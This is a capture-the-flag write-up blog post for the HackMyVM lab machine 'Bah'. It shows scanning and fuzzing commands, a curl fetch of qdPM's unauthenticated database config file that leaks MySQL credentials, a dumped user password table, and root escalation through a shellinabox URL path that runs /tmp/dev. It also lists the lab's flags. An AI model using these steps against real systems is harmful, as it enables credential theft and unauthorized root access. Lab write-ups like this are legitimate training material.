---
layout: post
author: canarinho
title:  "Bah"
date:   2022-01-01 09:32:26 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Bah)

## Scanning and Fuzzing

{% highlight text  %}
Starting Nmap 7.92 ( <https://nmap.org> ) at 2021-12-27 15:56 -03
Nmap scan report for bah (192.168.15.95)
Host is up (0.0027s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-title: qdPM | Login
|_http-server-header: nginx/1.18.0
3306/tcp open  mysql   MySQL 5.5.5-10.5.11-MariaDB-1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.5.11-MariaDB-1
|   Thread ID: 34
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, LongColumnFlag, SupportsCompression, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ,TFAQU8V)eDcGwC&4sh0
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:3C:48:35 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
{% endhighlight  %}

{% highlight bash  %}
ffuf -u <http://192.168.15.95/FUZZ> -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30 -e .txt,.js,.sql,.php
	index.php               [Status: 200, Size: 5664, Words: 569, Lines: 146]
	readme.txt              [Status: 200, Size: 470, Words: 60, Lines: 13]
	check.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
	robots.txt              [Status: 200, Size: 26, Words: 2, Lines: 3]
{% endhighlight  %}

Checking `http://192.168.15.95/readme.txt`

{% highlight text  %}
qdPM
open source project management software written in symfony framework
<http://qdpm.net>

INSTALLATION
qdPM is web-based application and it means you have to have web-server.
Simply go to your qdPM web directory and use installer

SUPPORT
Contact me (support@qdpm.net) if you have any questions, suggestions or feedback about qdPM.
My name is Sergey. I always reply to emails within 24-48 hours.

Thanks for downloading and using qdPM open-source solution!
{% endhighlight  %}

## Getting User

`searchsploit -m php/webapps/50176.txt`

The password is storaged on a unauthenticated file, easy to download.

{% highlight bash  %}
curl <http://192.168.15.95/core/config/databases.yml>

	all:
	  doctrine:
	    class: sfDoctrineDatabase
	    param:
	      dsn: 'mysql:dbname=qpm;host=localhost'
	      profiler: false
	      username: qpmadmin
	      password: "<?php echo urlencode('qpmpazzw') ; ?>"
	      attributes:
	        quote_identifier: true

{% endhighlight  %}

So, we got the qpmadmin creds.

{% highlight text  %}
qpmadmin:qpmpazzw
{% endhighlight  %}

Using them to access the mysql server, we got some vhosts and users.

{% highlight sql  %}
use hidden;
select *  from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | [http://portal.bah.hmv](http://portal.bah.hmv/)   |
|  2 | [http://imagine.bah.hmv](http://imagine.bah.hmv/)  |
|  3 | [http://ssh.bah.hmv](http://ssh.bah.hmv/)      |
|  4 | [http://dev.bah.hmv](http://dev.bah.hmv/)      |
|  5 | [http://party.bah.hmv](http://party.bah.hmv/)    |
|  6 | [http://ass.bah.hmv](http://ass.bah.hmv/)      |
|  7 | [http://here.bah.hmv](http://here.bah.hmv/)     |
|  8 | [http://hackme.bah.hmv](http://hackme.bah.hmv/)   |
|  9 | [http://telnet.bah.hmv](http://telnet.bah.hmv/)   |
| 10 | [http://console.bah.hmv](http://console.bah.hmv/)  |
| 11 | [http://tmux.bah.hmv](http://tmux.bah.hmv/)     |
| 12 | [http://dark.bah.hmv](http://dark.bah.hmv/)     |
| 13 | [http://terminal.bah.hmv](http://terminal.bah.hmv/) |
+----+-------------------------+

select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
{% endhighlight  %}

In order to figure out which vhost is the right one, lets fuzzing.

{% highlight bash  %}
ffuf -u <http://192.168.15.95/> -c -w urls.txt -t 30 -H "host: FUZZ"

	party.bah.hmv           [Status: 200, Size: 5216, Words: 1247, Lines: 124]
	ssh.bah.hmv             [Status: 200, Size: 5651, Words: 569, Lines: 146]
	imagine.bah.hmv         [Status: 200, Size: 5659, Words: 569, Lines: 146]
	telnet.bah.hmv          [Status: 200, Size: 5657, Words: 569, Lines: 146]
	ass.bah.hmv             [Status: 200, Size: 5651, Words: 569, Lines: 146]
	console.bah.hmv         [Status: 200, Size: 5659, Words: 569, Lines: 146]
	terminal.bah.hmv        [Status: 200, Size: 5661, Words: 569, Lines: 146]
	here.bah.hmv            [Status: 200, Size: 5653, Words: 569, Lines: 146]
	hackme.bah.hmv          [Status: 200, Size: 5657, Words: 569, Lines: 146]
	tmux.bah.hmv            [Status: 200, Size: 5653, Words: 569, Lines: 146]
	dark.bah.hmv            [Status: 200, Size: 5653, Words: 569, Lines: 146]
	dev.bah.hmv             [Status: 200, Size: 5651, Words: 569, Lines: 146]
	portal.bah.hmv          [Status: 200, Size: 5657, Words: 569, Lines: 146]

{% endhighlight  %}

`party.bah.hmv` has more words, so that’s the one.

Try to login using the users that we already got until succeeded.

{% highlight text  %}
rocio:Ihaveaflower ← this is the guy!
{% endhighlight  %}

Reverse shell it, and toplay no hatchofly, thank you!!

{% highlight text  %}
user.txt 	->	HdsaMoiuVdsaeqw
{% endhighlight  %}

## Privesc

Searching for something on process we found the follow:

{% highlight bash  %}
ps aux

shellin+     439  0.0  0.3   7484  3196 ?        Ss   09:40   0:00 /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellina
shellin+     440  0.0  0.2   7152  2528 ?        S    09:40   0:00 /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellina
{% endhighlight  %}

Let’s check the cmdline file, using the pid to find on `/proc`

{% highlight text  %}
rocio@bah:~$ cat /proc/439/cmdline
/usr/bin/shellinaboxd-q--background=/var/run/shellinaboxd.pid-c/var/lib/shellinabox-p4200-ushellinabox-gshellinabox--user-cssBlack on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css--no-beep--disable-ssl--localhost-only-s/:LOGIN-s/devel:root:root:/:/tmp/dev

{% endhighlight  %}

Note that when [`http://party.bah.hmv/devel`](http://party.bah.hmv/devel) is accessed the `/tmp/dev` will be executed.

So, access [`http://party.bah.hmv/devel`](http://party.bah.hmv/devel) and get the root shell. Tchupacky two play no ratchofly. It’s us!!

{% highlight text  %}
root.txt 	->	HMVssssshell323
{% endhighlight  %}

See you!! Bjos!